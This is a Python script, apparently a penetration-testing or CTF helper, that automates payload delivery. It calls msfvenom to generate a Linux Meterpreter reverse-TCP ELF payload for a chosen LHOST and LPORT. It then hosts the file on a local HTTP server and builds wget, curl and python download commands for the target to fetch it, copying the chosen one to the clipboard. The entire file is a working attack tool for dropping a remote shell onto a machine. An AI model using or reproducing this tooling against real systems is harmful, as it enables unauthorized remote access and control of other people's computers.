import subprocess
import re
import threading
import http.server
import socketserver
import socket
import sys
import os

# ---------- Helpers ----------
def is_valid_port(p):
    try:
        n = int(p)
        return 1 <= n <= 65535
    except (ValueError, TypeError):
        return False

def is_valid_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except OSError:
        return False

def port_in_use(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            s.bind(("0.0.0.0", port))
            return False
        except OSError:
            return True

def find_free_port(start):
    p = start
    while p <= 65535:
        if not port_in_use(p):
            return p
        p += 1
    return None

# ---------- LHOST ----------
lhost = input("lhost: ").strip()
if lhost == "":
    try:
        result = subprocess.run(
            ["ip", "a", "show", "tun0"],
            capture_output=True, text=True, timeout=5
        )
        match = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)", result.stdout or "")
        if match:
            lhost = match.group(1)
        else:
            print("[!] Could not find inet address on tun0")
            sys.exit(1)
    except (subprocess.SubprocessError, FileNotFoundError) as e:
        print(f"[!] Error getting tun0 IP: {e}")
        sys.exit(1)

if not is_valid_ip(lhost):
    print(f"[!] Invalid LHOST: {lhost}")
    sys.exit(1)
print(f"[*] Using LHOST: {lhost}")

# ---------- LPORT ----------
lport = input("lport: ").strip()
if lport == "":
    lport = "9443"
if not is_valid_port(lport):
    print(f"[!] Invalid port: {lport}. Falling back to 9443.")
    lport = "9443"
lport = int(lport)

if port_in_use(lport):
    new_port = find_free_port(lport + 1)
    if new_port is None:
        print(f"[!] Port {lport} in use and no free port found.")
        sys.exit(1)
    print(f"[!] Port {lport} already in use. Switching to {new_port}.")
    lport = new_port

print(f"[*] Using LPORT: {lport}")

# ---------- OS env ----------
osenv = input("os_env [def lin] [1 win]: ").strip()
if osenv == "":
    os_env = 0
else:
    try:
        os_env = int(osenv)
        if os_env not in (0, 1):
            raise ValueError
    except ValueError:
        print("[!] Invalid os_env, defaulting to Linux (0).")
        os_env = 0

# ---------- Outfile ----------
outfile = input("outfile: ").strip()
if outfile == "":
    outfile = "meter.elf"
# Sanitize: no path traversal / weird chars
outfile = os.path.basename(outfile)
if not outfile:
    print("[!] Invalid outfile name.")
    sys.exit(1)
print(f"[*] Using outfile: {outfile}")

# ---------- msfvenom ----------
if os_env == 0:
    cmd = [
        "msfvenom",
        "-p", "linux/x64/meterpreter_reverse_tcp",
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-f", "elf",
        "-o", outfile,
    ]
    print(f"[*] Running: {' '.join(cmd)}")
    try:
        ret = subprocess.run(cmd, check=False)
        if ret.returncode != 0:
            print(f"[!] msfvenom exited with code {ret.returncode}")
            sys.exit(1)
    except FileNotFoundError:
        print("[!] msfvenom not found in PATH.")
        sys.exit(1)
elif os_env == 1:
    print("please wait for script update")
    sys.exit(0)

if not os.path.isfile(outfile):
    print(f"[!] Payload file '{outfile}' was not created. Aborting.")
    sys.exit(1)

# ---------- Server type ----------
server_type = input("server_type [def python] [1 php]: ").strip()
if server_type != "":
    print("the method is not LOL(living off land). please wait for script update")
    sys.exit(0)

# ---------- Download commands ----------
print("on target try:")
download_cmd = f"wget http://{lhost}:{lport}/{outfile}"
curl_cmd     = f"curl http://{lhost}:{lport}/{outfile} -o {outfile}"
py_cmd       = f"python3 -c \"import urllib.request; urllib.request.urlretrieve('http://{lhost}:{lport}/{outfile}','{outfile}')\""
print(f"1. {download_cmd}")
print(f"2. {curl_cmd}")
print(f"3. {py_cmd}")

# ---------- Server + events ----------
get_hit        = threading.Event()
shutdown_event = threading.Event()
server_ready   = threading.Event()
server_error   = {"msg": None}

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        get_hit.set()
        super().do_GET()
    def log_message(self, fmt, *args):
        pass  # silence

def start_server():
    httpd = None
    try:
        socketserver.TCPServer.allow_reuse_address = True
        httpd = socketserver.TCPServer(("0.0.0.0", lport), Handler)
        httpd.timeout = 0.5
        server_ready.set()
        while not shutdown_event.is_set():
            httpd.handle_request()
    except OSError as e:
        server_error["msg"] = str(e)
        server_ready.set()
    finally:
        if httpd is not None:
            try:
                httpd.server_close()
            except Exception:
                pass

server_thread = threading.Thread(target=start_server, daemon=True)
server_thread.start()

# Wait until the thread either binds or fails
server_ready.wait(timeout=3)
if server_error["msg"]:
    print(f"[!] Failed to start HTTP server: {server_error['msg']}")
    sys.exit(1)
if not server_thread.is_alive():
    print("[!] HTTP server thread died unexpectedly.")
    sys.exit(1)

print(f"[*] Python HTTP server started on 0.0.0.0:{lport}")

# ---------- Clipboard ----------
def copy_to_clipboard(text):
    for cmd in (["xclip", "-selection", "clipboard"],
                ["xsel", "--clipboard", "--input"]):
        try:
            subprocess.run(cmd, input=text, text=True, check=True)
            print(f"[*] Copied to clipboard: {text}")
            return
        except (FileNotFoundError, subprocess.CalledProcessError):
            continue
    print(f"[!] Could not copy to clipboard. Command: {text}")

# ---------- Choice loop ----------
chosen_cmd = None
while chosen_cmd is None:
    if get_hit.is_set():
        print("GET req hit, enter to confirm exit")
        if input() == "":
            shutdown_event.set()
            server_thread.join(timeout=2)
            print("[*] Server stopped. Exiting.")
            sys.exit(0)

    try:
        copy_choice = input("choice: ").strip()
    except EOFError:
        shutdown_event.set()
        server_thread.join(timeout=2)
        sys.exit(0)

    if copy_choice == "":
        chosen_cmd = download_cmd
    elif copy_choice == "2":
        chosen_cmd = curl_cmd
    elif copy_choice == "3":
        chosen_cmd = py_cmd
    else:
        print("[!] Invalid choice. Press enter for default (wget).")

copy_to_clipboard(chosen_cmd)
print("chosen, now hit the target...")

# ---------- Wait for GET hit, then confirm exit ----------
print("[*] Waiting for GET request...")
try:
    while not shutdown_event.is_set():
        if get_hit.wait(timeout=0.5):
            break
except KeyboardInterrupt:
    shutdown_event.set()
    server_thread.join(timeout=2)
    print("\n[*] Interrupted. Exiting.")
    sys.exit(0)

if get_hit.is_set():
    print("GET req hit, enter to confirm exit")
    if input() == "":
        shutdown_event.set()
        server_thread.join(timeout=2)
        print("[*] Server stopped. Exiting.")
        sys.exit(0)
